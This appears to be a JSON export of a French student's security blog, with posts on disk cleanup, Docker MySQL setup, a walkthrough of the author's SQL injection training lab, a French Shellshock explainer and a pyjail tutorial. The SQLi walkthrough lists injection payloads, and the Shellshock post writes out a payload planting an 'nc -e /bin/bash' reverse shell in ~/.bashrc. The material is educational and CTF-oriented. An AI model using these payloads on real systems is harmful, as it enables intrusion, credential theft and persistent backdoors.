[{"content":"Recently I wanted to run a MySQL Docker container and encountered a tragical error:\nsimple_db | 2021-03-25 10:54:04+00:00 [Note] [Entrypoint]: Switching to dedicated user 'mysql' simple_db | 2021-03-25 10:54:04+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 5.7.31-1debian10 started. simple_db | 2021-03-25 10:54:04+00:00 [Note] [Entrypoint]: Initializing database files simple_db | 2021-03-25T10:54:04.578298Z 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated. Please use --explicit_defaults_for_timestamp server option (see documentation for more details). simple_db | 2021-03-25T10:54:04.580054Z 0 [ERROR] --initialize specified but the data directory has files in it. Aborting. simple_db | 2021-03-25T10:54:04.580073Z 0 [ERROR] Aborting simple_db | simple_db exited with code 1 I was really surprised while reading this one, because the container was working well minutes before. After reading the documentation, and searching on the web for more info, nothing worked for me: the container would not run.\nI decided to check for docker-compose updates with my package manager, and guess what? No more space on my root partition üò´\nEverybody who played around with Linux distro had one day this view:\nHow to free disk space on Linux? I will try to show a couple of ways I managed to free space on my root partition.\nPackage manager cache  As I am running on Archlinux, my package manager might be different as yours (ie. I use pacman and not apt so be carefull).\n The first thing I did was to clear my pacman cache, because I knew it would free some space for sure:\n1  sudo pacman -Scc   You can check this blog post which explains how to deal with pacman cache: \nWith that I cleared almost 30G of data on my disk:\nDocker Yeah, freeing 30G is pretty satisfying, but imagine freeing more. Joking. But imagine anyway.\nI use Docker a lot, especially while working for school projects or CTFs, so I thought about checking my images and trying to free some more space.\nAfter running sudo docker images I realized I needed to clean those. I mean, there was like 100 images that I do not use anymore (yes, InterIUT challenges, I talk about you ü•≤ ).\n1  sudo docker images prune   This freed 2G on the disk, I was happy about that, but I saw that Docker was still taking too much space here, like 15G could be saved. I realized that Docker volumes where still there, and I decided to remove them.\n1  sudo docker volume prune   Leading me with a total of 40G freed in minutes!\nSort disk usage While troubleshouting my disk usage, I used this command to sort by usage:\n1  sudo du / -x -d 1 | sort -n   You can then investigate which directory is taking most usage on your disk.\n","permalink":"https://0xninja.fr/posts/free-space-on-disk/","summary":"Recently I wanted to run a MySQL Docker container and encountered a tragical error:\nsimple_db | 2021-03-25 10:54:04+00:00 [Note] [Entrypoint]: Switching to dedicated user 'mysql' simple_db | 2021-03-25 10:54:04+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 5.7.31-1debian10 started. simple_db | 2021-03-25 10:54:04+00:00 [Note] [Entrypoint]: Initializing database files simple_db | 2021-03-25T10:54:04.578298Z 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated. Please use --explicit_defaults_for_timestamp server option (see documentation for more details). simple_db | 2021-03-25T10:54:04.","title":"Free space on disk for Linux distros"},{"content":"Some weeks ago I created a trainning lab for SQL injections called SQLi lab. And I will go through all levels in this blog post, explainning the expected way to solve each of them.\n The lab currently contains 5 levels, and I will update this post as I add more of them üëç\n Installation The GitHub repository is at https://github.com/OxNinja/SQLi-lab if you want more information.\nFirst I clone the lab in a folder, add its IP to my hosts file for conveignance, and then build it with the given script:\n1 2 3 4  git clone https://github.com/OxNinja/SQLi-lab.git cd SQLi-lab echo \u0026#39;172.16.0.2 sqli.lab\u0026#39; \u0026gt;\u0026gt; /etc/hosts ./build.sh   Let\u0026rsquo;s wait for about 5-10 seconds for the MySQL container to boot, and then visit http://172.16.0.2, or http://sqli.lab, you should get this:\nWe can now start level 1!\nLevel 1 By reading the level\u0026rsquo;s introduction, we know that the admin uses a database with its passwords. We want to get them all, without having to guess the website. But first we need to know how the server works.\nBy inputing a random website we get:\nThe output is not that verbose, but we might be able to guess the SQL query made:\n1  SELECT password FROM my_table WHERE website=\u0026#39;$website\u0026#39;   So let\u0026rsquo;s try a basic injection, like ' or 1=1-- -:\nOkay we got him, we have the URL for the next level.\nLevel 2 Here we need to retrieve the admin\u0026rsquo;s password. Let\u0026rsquo;s try admin:admin:\nOf course we don\u0026rsquo;t have anything. With the information we have, we can imagine the SQL query:\n1  SELECT username, mail, password FROM users WHERE username=\u0026#39;$username\u0026#39; AND password=\u0026#39;$password\u0026#39;   We can try again with a basic injection ' or 1=1;-- -:\nIt works fine üòä\nWe could also have injected the payload in the password field:\nLevel 3 An online shop! We must find what is hidding in there. But first, let\u0026rsquo;s use this product search input:\nNothing really interesting üòê\nBut we see a message on the page: \u0026lsquo;Login is disabled for the moment.' what is this? Maybe we could see something in the source code?\nBingo! We have an SQL query, but how can we use it? The only solution here is to make an UNION-based SQL injection. Let\u0026rsquo;s try it out:\n1  UNION SELECT * FROM level3_users   Should do the trick. Our payload: ' UNION SELECT * FROM leve3_users;-- -\nYes it works! We continue to the fourth level.\nLevel 4 This level might be harder than the previous ones for some attackers. And it is normal üòà\nThe page shows us some buttons we can click to get an article\u0026rsquo;s content:\nNote the ?id= parameter in the URL this could help us in the future.\nLet\u0026rsquo;s see the generated source code:\nHow interesting, the server adds a comment containing the article\u0026rsquo;s id right before its content.\nHere we don\u0026rsquo;t have that much information. Our only escape could be \u0026ndash; again \u0026ndash; an UNION-based SQLi. Let\u0026rsquo;s try one:\nWe don\u0026rsquo;t get anything from it, even if we provided an article\u0026rsquo;s id üòï\nThe right thing to ask is: why? Why do we get nothing with our payload? Why is the article 3 not even rendered?\nIn an UNION query, both SELECT statements must return the same number of columns! So maybe we are wrong, maybe there is not two columns in the server\u0026rsquo;s query. We can figure out the server\u0026rsquo;s query:\n1  SELECT * FROM articles WHERE id=\u0026#39;$id\u0026#39;   But how many columns are in there? We can count what we see on the page: the title and the content of the article\u0026hellip; AND the id! Those are three columns. Let\u0026rsquo;s try with three columns:\nWe now have a second article rendered on the page! We can try to customize our payload to select strings or values:\nNice it works as we want! We now want to know the database\u0026rsquo;s name:\nOK, now we want to know the tables of the database:\nNote the limit 1,1 at the end, we need it in order to retrieve one by one. Otherwise the UNION query will get an error because we want to SELECT more elements than the first statement.\nHere we get the table COLLATIONS, which is part of the MySQL\u0026rsquo;s server by default. We only want the tables from our database database:\nOK now we want to get the columns of this table:\nContinuing like this we get the database\u0026rsquo;s schema:\n1 2 3 4  CREATE DATABASE database; CREATE TABLE level4_articles (id int, title text, content text); CREATE TABLE level4_users (username text, password text);   Level 5 We want to find the admin\u0026rsquo;s password. Let\u0026rsquo;s try the basic admin:admin:\nOf course we got a \u0026ldquo;Wrong username/password\u0026rdquo; message. Maybe we can try a basic SQLi?\nNice, the server think we are admin! But the goal here is to find the password, not to log as him.\nWe now know that this form is vulnerable to SQL injections, and when we are logged as the admin we have a \u0026ldquo;Welcome admin\u0026rdquo; message. Maybe we can try a blind injection like so:\nBetter! we transformed the query:\n1 2 3 4  # From: SELECT * FROM users WHERE username=\u0026#39;$username\u0026#39; AND password=\u0026#39;$password\u0026#39; # To: SELECT * FROM users WHERE username=\u0026#39;admin\u0026#39; AND password=\u0026#39;\u0026#39; OR password LIKE \u0026#39;%\u0026#39;;-- -\u0026#39;   Which can lead us to the admin\u0026rsquo;s password! Let\u0026rsquo;s continue like so:\nWe now know that the first character of the password is not \u0026ldquo;a\u0026rdquo;. Great! Moving on by changing the letter each time we get the first letter: \u0026ldquo;f\u0026rdquo;\nWe now have a method to find the whole password, so I will skip to the end untill the final check:\nAfter this point, no matter what the next character is, we get the \u0026ldquo;Wrong username/password\u0026rdquo; message. This means that we reached the end of the password, let\u0026rsquo;s check it out:\nGreat! We know the admin\u0026rsquo;s password now. To continue we have to get to the page /f05c8652de134d5c50729fa1b31d355b.php.\nOn this page we are redirected to /win.php, meanning we got to the end of the lab.\nWe just finished the last level of this lab! It was fun, wasn\u0026rsquo;t it?\n","permalink":"https://0xninja.fr/posts/sqli-lab/","summary":"Some weeks ago I created a trainning lab for SQL injections called SQLi lab. And I will go through all levels in this blog post, explainning the expected way to solve each of them.\n The lab currently contains 5 levels, and I will update this post as I add more of them üëç\n Installation The GitHub repository is at https://github.com/OxNinja/SQLi-lab if you want more information.\nFirst I clone the lab in a folder, add its IP to my hosts file for conveignance, and then build it with the given script:","title":"SQLi lab solutions"},{"content":"Yeah, I wanted to do one of those for a long time üòÅ\nSo, we have to stay at home for the moment, I decided to make a \u0026ldquo;walkthrough\u0026rdquo; about something I used sometimes and I couldn\u0026rsquo;t remember all the commands. So, let\u0026rsquo;s build our MySQL database within a Docker container üê≥ !\nGet the Docker image I will be using the mysql image from the Docker hub.\n1  docker pull mysql   Run the container For further details, you can read the official documentation for the image on Docker hub. I will just go through the basic steps I use.\n1  docker run --name my_container -e MYSQL_ROOT_PASSWORD=toor -d mysql:latest    --name : setup a name for our container -e : setup environment variables  MYSQL_ROOT_PASSWORD : need explainations ?   -d : run in deamon mode mysql:latest : use the mysql image in the latest version  Administrate the database Once the container is running in background, we have to connect to it :\n1  docker exec -it my_container /bin/bash   Here, we connect to the running container and pop a shell in interactive mode. We have to connect to the database :\n1  mysql -uroot -ptoor   Now we can start to use SQL commands for our database.\nCreate the database 1 2  CREATE DATABASE my_db; USE my_db   Create the table 1  CREATE TABLE compotes (id INT, name TEXT, note INT);   Manipulate the table INSERT We want now to add some data in our table :\n1 2  INSERT INTO compotes (id, name, note) VALUES (0, \u0026#34;Apple\u0026#34;, 3); INSERT INTO compotes (id, name, note) VALUES (1, \u0026#34;Apple \u0026amp; banana\u0026#34;, 5), (2, \u0026#34;Apple \u0026amp; pear\u0026#34;, 4), (3, \u0026#34;Apple \u0026amp; apple\u0026#34;, 3);   UPDATE Oh no, I f\u0026rsquo;cked up my data ! Apple \u0026amp; banana is not that tasty !\n1  UPDATE compotes SET (note=4) WHERE id=1;   Better.\nDELETE So drunk I added apple \u0026amp; apple in my table sight\n1  DELETE FROM compotes WHERE name=\u0026#34;Apple \u0026amp; apple\u0026#34;;   OK, we are good.\nSELECT I want to see my beautiful compotes now !\n1 2 3 4 5  SELECT * FROM compotes; SELECT name, note FROM compotes; SELECT * FROM compotes WHERE id \u0026gt; 1 AND note = 3;   Use SQL script We don\u0026rsquo;t want to re-type all the database when building a new container !\nSQL scripts are cool for that :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  # populate.sql # SQL script to build the compotes table in our database create database my_db; use my_db create table compotes(id int, name text, note int); insert into compotes(id, text, note) values (0, \u0026#34;Apple\u0026#34;, 3), (1, \u0026#34;Apple \u0026amp; banana\u0026#34;, 5), (2, \u0026#34;Apple \u0026amp; pear\u0026#34;, 4);   And execute the script on the running container :\n1  docker exec -i my_container sh -c \u0026#39;exec mysql -uroot -ptoor\u0026#39; \u0026lt; populate.sql   ","permalink":"https://0xninja.fr/posts/setup-your-database-with-docker/","summary":"Yeah, I wanted to do one of those for a long time üòÅ\nSo, we have to stay at home for the moment, I decided to make a \u0026ldquo;walkthrough\u0026rdquo; about something I used sometimes and I couldn\u0026rsquo;t remember all the commands. So, let\u0026rsquo;s build our MySQL database within a Docker container üê≥ !\nGet the Docker image I will be using the mysql image from the Docker hub.\n1  docker pull mysql   Run the container For further details, you can read the official documentation for the image on Docker hub.","title":"Setup your database with Docker"},{"content":"Shellshock est une vuln√©rabilit√© pr√©sente dans bash 4.3 et ant√©rieur. Il s\u0026rsquo;agit d\u0026rsquo;une vuln√©rabilit√© logicielle qui se base sur de l\u0026rsquo;injection de commande en passant par les variables d\u0026rsquo;environement. C\u0026rsquo;est vachement cool car elle m√®ne √† une bonne grosse RCE des familles, donc c\u0026rsquo;est pas n√©gligeable üòò.\nStatistiques Quelques statistiques afin d\u0026rsquo;illustrer la port√©e et l\u0026rsquo;attention port√©e de la vuln√©rabilit√©.\nShellshock a beaucoup √©t√© √† la mode quand elle est sortie, √©norm√©ment de trafic a √©t√© g√©n√©r√© par des botnets lors de tentatives d\u0026rsquo;exploitation de la vuln√©rabilit√©.\nBon faut que je trouve des stats mais c\u0026rsquo;est un autre probl√®me\nComment √ßa marche ? 1  env _=\u0026#39;() { echo \u0026#34;Yeah ma boi\u0026#34;; }; echo \u0026#34;nc -e /bin/bash $IP $PORT\u0026#34; \u0026gt;\u0026gt; ~/.bashrc;\u0026#39;; bash -c \u0026#39;echo \u0026#34;Bonjour √† tous\u0026#34;\u0026#39;   L√† on force l\u0026rsquo;utilisateur √† lancer un shell sur $IP:$PORT √† chaque fois qu\u0026rsquo;il va ouvrir un shell, mais on peut immaginer d\u0026rsquo;innombrables autres sc√©narios d\u0026rsquo;attaque, de compromission de machine, ou de porte d√©rob√©e.\nPour comprendre le fonctionnement de cette payload, on va la prendre par √©tape.\nLes fonctions dans bash Si vous n\u0026rsquo;√™tes pas connaisseur, il est possible de cr√©er des fonctions dans bash directement, la syntaxe est la suivante :\n1 2 3 4 5 6 7 8 9  my_function () { echo \u0026#34;Hello\u0026#34; } # Ou plus explicitement function my_function () { echo \u0026#34;Hello\u0026#34; }   Pour l\u0026rsquo;ex√©cuter on peut l\u0026rsquo;appeller de cette mani√®re :\n1 2  $ my_function Hello   Utiliser une variable d\u0026rsquo;environnement avec bash Les variables d\u0026rsquo;environnement permettent de g√©rer pas mal de choses, mais principalement de passer des valeurs d\u0026rsquo;un programme √† un autre, sans passer par des √©tapes compliqu√©es.\n Note : les variables type $PATH, $SHELL, $PWD, $TERM\u0026hellip; sont des variables d\u0026rsquo;environnement, utilisables par des programmes.\n En bash :\n1 2 3 4 5 6  $ env BoC=\u0026#39;ovgr bh pbhvyyr\u0026#39; $ env | grep BoC BoC=ovgr bh pbhvyyr # On a bien notre nouvelle variable d\u0026#39;environnement # On peut aussi d√©clarer une fonction : $ env my_function=\u0026#39;() { echo \u0026#34;aHR0cHM6Ly9ncGguaXMvMWEzWDV0UQ==\u0026#34; | base64 -d; }\u0026#39;   On peut m√™me les utiliser dans un sous-shell :\n1  $ env my_function=\u0026#39;() { echo \u0026#34;aHR0cHM6Ly9ncGguaXMvMWEzWDV0UQ==\u0026#34; | base64 -d; }\u0026#39;; bash -c \u0026#39;my_function;\u0026#39;    L\u0026rsquo;utilisation de variables d\u0026rsquo;environnement dans des sous-shells a √©t√© supprim√©e depuis, mais si vous voulez quand m√™me tester, Docker ou VM üòâ\n Injection La partie sympa de Shellshock, c\u0026rsquo;est qu\u0026rsquo;on pouvait injecter une commande √† ex√©cuter via les variables d\u0026rsquo;environnement, en ajoutant la commande √† la suite de la d√©claration d\u0026rsquo;une fonction :\n1 2 3  $ env a=\u0026#39;() { echo \u0026#34;This is my function\u0026#34;; }; echo \u0026#34;Not in the func\u0026#34;\u0026#39;; bash -c \u0026#39;a;\u0026#39; Not in the func # Ne devrait pas √™tre appel√© ! This is my function   Donc ouais, Shellshock c\u0026rsquo;est quand m√™me vachement cool üòé.\n","permalink":"https://0xninja.fr/posts/la-vuln%C3%A9rabilite-shellshock/","summary":"Shellshock est une vuln√©rabilit√© pr√©sente dans bash 4.3 et ant√©rieur. Il s\u0026rsquo;agit d\u0026rsquo;une vuln√©rabilit√© logicielle qui se base sur de l\u0026rsquo;injection de commande en passant par les variables d\u0026rsquo;environement. C\u0026rsquo;est vachement cool car elle m√®ne √† une bonne grosse RCE des familles, donc c\u0026rsquo;est pas n√©gligeable üòò.\nStatistiques Quelques statistiques afin d\u0026rsquo;illustrer la port√©e et l\u0026rsquo;attention port√©e de la vuln√©rabilit√©.\nShellshock a beaucoup √©t√© √† la mode quand elle est sortie, √©norm√©ment de trafic a √©t√© g√©n√©r√© par des botnets lors de tentatives d\u0026rsquo;exploitation de la vuln√©rabilit√©.","title":"La vuln√©rabilit√© Shellshock"},{"content":"Introduction Tout d\u0026rsquo;abord qu\u0026rsquo;est-ce qu\u0026rsquo;une \u0026lsquo;pyjail\u0026rsquo; ? Il s\u0026rsquo;agit le plus souvent d\u0026rsquo;un environnement Python üêç restreint, c\u0026rsquo;est-√†-dire que (comme pour les autres types de \u0026lsquo;jails\u0026rsquo;) certaines fonctions, classes ont √©t√© supprim√©es, ou sont filtr√©es lors du traitement de l\u0026rsquo;input utilisateur pour bloquer l\u0026rsquo;attaquant.\nCes environnements restreints sont pr√©sents lors de CTFs mais c\u0026rsquo;est une cat√©gorie qui n√©cessite un peu de connaissances avant de s\u0026rsquo;y lancer, mais sont aussi utilis√©s dans des milieux professionnels afin d\u0026rsquo;√©viter de donner l\u0026rsquo;acc√®s √† tout le syst√®me si un attaquant arrive √† entrer sur un serveur SSH par exemple.\nUn peu de pratique Avec l\u0026rsquo;aide d\u0026rsquo;un cobaye pour le test, qui se reconna√Ætra, j\u0026rsquo;ai r√©alis√© quelques pyjails qui permettent de mieux appr√©hender le langage Python, mais aussi de d√©velopper une m√©thodologie de r√©solution.\nNous allons voir comment r√©soudre une jail des plus basiques ensemble, ensuite vous serez libres d‚Äôapprofondir vos connaissances avec d\u0026rsquo;autres jails que j\u0026rsquo;ai r√©alis√©, et si le c≈ìur vous en dit vous pouvez m√™me tenter de flag les jails sur Root-Me üòä.\nAvant de commencer V√©rifiez bien d\u0026rsquo;avoir Python 3 d\u0026rsquo;install√© sur votre machine, puis t√©l√©chargez cette archive zip qui contient l\u0026rsquo;environnement de travail ad√©quat pour r√©soudre toutes les jails. Cette archive contient un fichier flag.txt qui est lu par toutes les jails lorsque vous avez r√©ussi le challenge, vous devez alors laisser les fichiers jail*.py dans le m√™me dossier.\nPour d√©marrer Au pr√©alable, d√©compressez le fichier zip :\n1  mkdir jails; unzip jails.zip -d jails/; cd jails   Pour lancer une jail de votre choix vous avez simplement √† l\u0026rsquo;ex√©cuter avec Python :\n1  python3 jail1.py    Note : les jails sont class√©es par difficult√© croissante, on a alors jail1 plus simple que jail3\n Au boulot ! Passons √† la r√©alisation de la jail 1. Le but est de finir le challenge sans lire le code source du fichier, mais si vous √™tes bloqu√© plusieurs heures n\u0026rsquo;h√©sitez pas √† y jeter un coup d‚Äô≈ìil rapide.\nPremier lan√ßement Pour nous √©chapper de cette prison nous allons devoir √©tudier comment fonctionne le programme. On lance la jail1 :\nTests Effectuons quelques tests afin de d√©terminer ce que l\u0026rsquo;on peut faire dans cet environement restreint :\nOn peut voir que les op√©rations usuelles (calculs, affichage, variables\u0026hellip;) sont autoris√©es, essayons sd\u0026rsquo;appeler la m√©thode flag() afin de sortir :\nPas de chance, rien ne se passe, pourtant on voit bien que flag est une fonction, on devrait √™tre en mesure de l\u0026rsquo;apeller, comme pour print() par exemple.\nIl doit se passer quelque chose entre le moment o√π l\u0026rsquo;on entre la commande et l\u0026rsquo;ex√©cution de cette derni√®re üòî.\nEssayons de d√©terminer le probl√®me :\nR√©solution On comprend alors que l\u0026rsquo;entr√©e utilisateur est filtr√©e : si la cha√Æne \u0026quot;flag()\u0026quot; est pr√©sente, elle est supprim√©e. Comment y rem√©dier ?\nIl existe une astuce moldave bien connue pour contourner ce filtre, vous connaissez le film Inception ? C\u0026rsquo;est le m√™me principe, sauf que c\u0026rsquo;est pas dans un r√™ve mais un shell Python.\nEn effet, √©crire fflag()lag(), ou flag(flag()), ou toute autre variation permet de contourner le filtre. üéâüéâ\n","permalink":"https://0xninja.fr/posts/les-pyjails-pour-les-d%C3%A9butants/","summary":"Introduction Tout d\u0026rsquo;abord qu\u0026rsquo;est-ce qu\u0026rsquo;une \u0026lsquo;pyjail\u0026rsquo; ? Il s\u0026rsquo;agit le plus souvent d\u0026rsquo;un environnement Python üêç restreint, c\u0026rsquo;est-√†-dire que (comme pour les autres types de \u0026lsquo;jails\u0026rsquo;) certaines fonctions, classes ont √©t√© supprim√©es, ou sont filtr√©es lors du traitement de l\u0026rsquo;input utilisateur pour bloquer l\u0026rsquo;attaquant.\nCes environnements restreints sont pr√©sents lors de CTFs mais c\u0026rsquo;est une cat√©gorie qui n√©cessite un peu de connaissances avant de s\u0026rsquo;y lancer, mais sont aussi utilis√©s dans des milieux professionnels afin d\u0026rsquo;√©viter de donner l\u0026rsquo;acc√®s √† tout le syst√®me si un attaquant arrive √† entrer sur un serveur SSH par exemple.","title":"Les pyjails pour les d√©butants"},{"content":"French ingeneering student in cybersecurity, I like the web, reverse and assembly.\nI participate in CTFs with my team FakeNews. I mostly do the web challenge because this is the easiest when you begin in cybersecurity. üòá\n CTF InterIUT 2020 staff üèÅ Norzh CTF 2021 staff üß≠  Why this website The first need of this blog was to help me to remind things as I learn them, and this is a great chance to share my knowledges with others!\nThe idea is to present subjects linked with security, for all levels (beginner to more advanced). I started with common domains, and with time I will share more advanced intel as I learn them.\nMISC Twitter\nGitHub\nRoot-Me | HacktTheBox | TryHackMe\n","permalink":"https://0xninja.fr/about/","summary":"French ingeneering student in cybersecurity, I like the web, reverse and assembly.\nI participate in CTFs with my team FakeNews. I mostly do the web challenge because this is the easiest when you begin in cybersecurity. üòá\n CTF InterIUT 2020 staff üèÅ Norzh CTF 2021 staff üß≠  Why this website The first need of this blog was to help me to remind things as I learn them, and this is a great chance to share my knowledges with others!","title":"About"},{"content":" I made some projects, some are very interesting, and some are more for learning purposes or testing. I listed here the ones I am the more proud of, but you can get a more exhaustive list by looking here:\n https://github.com/OxNinja https://git.fakenews.sh   CTF Kit (mirrored on Github) A CLI tool to automate CTF deployment. Focus on the challenges üö©\nSQLi lab A cybersecurity playground to test your üíâ SQL injection skills!\nMonSQL The French version of the famous MySQL üá´üá∑\n üêß Linux build üêç Python package üíª PHP library  Science in school docs French documentation websites about science in general, separated by classes and domains:\n üìê Mathematics üî≠ Physics (I talk about Kerbal Space Program too) Some more incomming such as hardware, chemistry, programing\u0026hellip;  ","permalink":"https://0xninja.fr/projects/","summary":"I made some projects, some are very interesting, and some are more for learning purposes or testing. I listed here the ones I am the more proud of, but you can get a more exhaustive list by looking here:\n https://github.com/OxNinja https://git.fakenews.sh   CTF Kit (mirrored on Github) A CLI tool to automate CTF deployment. Focus on the challenges üö©\nSQLi lab A cybersecurity playground to test your üíâ SQL injection skills!","title":"Projects"}]